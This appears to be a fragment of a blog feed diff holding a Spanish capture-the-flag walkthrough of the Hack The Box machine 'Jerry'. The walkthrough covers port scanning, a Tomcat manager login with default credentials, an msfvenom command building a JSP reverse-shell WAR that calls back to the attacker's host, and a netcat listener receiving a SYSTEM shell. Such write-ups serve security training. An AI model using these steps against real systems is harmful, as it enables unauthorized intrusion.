-Discovered open port 8080/tcp on 10.10.10.95
-Completed SYN Stealth Scan at 21:15, 26.50s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2022-03-13 21:14:52 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
-Not shown: 65534 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT     STATE SERVICE    REASON
-8080/tcp open  http-proxy syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.58 seconds
-           Raw packets sent: 131088 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;836B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────
-       │ File: extractPorts.tmp
-       │ Size: 115 B
-───────┼─────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.95
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 8080
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-13 21:16 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT     STATE SERVICE VERSION
-8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
-|_http-favicon: Apache Tomcat
-|_http-title: Apache Tomcat/7.0.88
-|_http-server-header: Apache-Coyote/1.1
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;12.72 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que se encuentra abierto el puerto 8080 y como siempre, antes de visualizar el contenido vía web, vamos a utilizar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para ver a lo que nos enfrentamos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.95:8080
-http://10.10.10.95:8080 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que nos enfrentamos antes un Apache Tomcat, lo cual lo validamos vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a ver si se puede acceder al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html&lt;/code&gt; y hacer uso de las credenciales por defect &lt;strong&gt;tomcat : s3cret&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya nos encontramos dentro del Gestor de Aplicaciones Web de Tomcat, por lo tanto, ya debemos estar pensando en generar un archivo de extensión &lt;strong&gt;war&lt;/strong&gt; para subirlo y obtener acceso al sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.27 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.war
-Payload size: 1103 bytes
-Final size of war file: 1103 bytes
-
-❯ ll
-.rw-r--r-- root root 1.1 KB Tue Mar 15 01:41:14 2022  shell.war
-❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;shell.war /home/k4miyo/Descargas/Firefox/.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Subimos nuestro archivo al servidor:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos ponemos en escucha por el puerto 443 y ahora seleccionamos nuestro archivo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.95] 49192
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.3.9600]
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2013 Microsoft Corporation. All rights reserved.
-
-C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;whoami
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya hemos ingresado a la máquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Arbitrary_File_Upload" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Jerry en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar al flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Nibbles en la plataforma de Hack The Box</summary></entry></feed>
